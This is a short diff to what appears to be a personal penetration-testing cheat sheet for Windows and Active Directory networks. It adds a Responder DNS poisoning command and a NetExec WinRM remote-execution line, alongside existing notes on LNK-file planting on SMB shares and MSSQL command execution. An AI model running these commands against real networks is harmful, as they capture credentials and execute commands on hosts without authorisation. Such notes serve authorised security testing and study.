@@ -55,6 +55,9 @@ Get IP and hostname
 ### DHCP
 `responder -I eth0 -wdF`
 
+### DNS
+`responder -I eth0 -wDF`
+
 ## Inveigh
 
 # ASREP Roasting
@@ -133,6 +136,9 @@ Creating a LNK file in an SMB share with WRITE privileges, need to run Responder
 `nxc smb <ip> -u user -p password -M slinky -o NAME=shortcut_name SERVER=<IP>`
 
 `nxc mssql <ip> -u user -p password -x 'whoami'`
+
+`nxc winrm <ip> -u user -p password -x 'whoami'`
+
 
 # smbmap
 
